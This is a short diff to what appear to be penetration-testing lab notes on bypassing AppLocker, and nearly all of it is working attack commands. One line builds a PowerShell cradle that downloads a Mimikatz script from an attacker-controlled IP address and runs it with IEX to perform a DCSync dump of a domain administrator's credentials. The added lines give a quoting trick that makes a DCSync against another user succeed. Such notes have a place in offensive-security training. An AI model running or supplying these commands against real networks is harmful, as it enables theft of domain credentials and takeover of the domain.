@@ -52,7 +52,13 @@ String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.
 String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/mimikatz.txt') | IEX; Invoke-Mimikatz -Command "`"lsadump::dcsync /domain:infinity.com /user:infinity\\administrator`""";
 ```
 
-Instead use the interactive C# code in the AppLocker.md to run Invoke-Mimikatz
+Instead use the interactive C# code in the AppLocker.md to run Invoke-Mimikatz.
+However there is some weird shit and the command must be run like this (note the single quotation followed by double quotation)
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:pete"'
+```
+
 
 
 *ALTERNATIVE WAY*
